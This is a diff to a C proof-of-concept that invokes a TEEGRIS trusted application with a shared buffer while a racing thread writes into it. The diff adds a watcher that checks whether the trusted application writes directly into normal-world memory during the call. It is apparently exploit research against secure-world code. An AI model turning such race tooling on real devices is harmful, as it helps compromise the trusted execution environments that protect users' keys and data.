@@ -8,6 +8,7 @@
 #include <string.h>
 #include "tee_client_api.h"
 #include "repro.h"
+#include "zerocopy.h"
 #include <dlfcn.h>
 
 TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
@@ -74,6 +75,11 @@ typedef struct pls{
  * thing to vary on a new device. Override at run time: ./poc [size] [cmd]. */
 static size_t buf_size = 0x212214;
 static uint32_t cmd_id = 0x11;
+/* Watched window for the zero-copy check: small and fast so that many polls
+ * fit inside one invoke, and disjoint from the offset the racing thread writes
+ * (0x8200c), so anything seen there was written by the TA. */
+static size_t watch_off = 0x82000;
+static size_t watch_len = 12;
 
 void send_req(TEEC_Context *context, TEEC_Session *session)
 {
@@ -119,7 +125,12 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
         perror("pthread_create failed");
         return;
     }
+    /* shm is the mapping the TEE was handed, not a client-side bounce buffer,
+     * so a change here during the call is the TA writing into normal-world
+     * memory; it cannot be the client library copying results back. */
+    zc_start(shm, watch_off, watch_len);
     res = TEEC_InvokeCommand_impl(session, cmd_id, &op, &err_origin);
+    zc_stop();
     printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
 }
 
@@ -128,7 +139,10 @@ int main(int argc, char **argv)
 {
     if (argc > 1) buf_size = (size_t)strtoull(argv[1], NULL, 0);
     if (argc > 2) cmd_id = (uint32_t)strtoul(argv[2], NULL, 0);
-    printf("buf_size 0x%zx cmd 0x%x\n", buf_size, cmd_id);
+    if (argc > 3) watch_off = (size_t)strtoull(argv[3], NULL, 0);
+    if (argc > 4) watch_len = (size_t)strtoull(argv[4], NULL, 0);
+    printf("buf_size 0x%zx cmd 0x%x watch 0x%zx+0x%zx\n",
+           buf_size, cmd_id, watch_off, watch_len);
 
     char* ta = "00000000-0000-0000-0000-5345435f4652";
     TEEC_UUID *uuid = teegris_uuid(ta); 
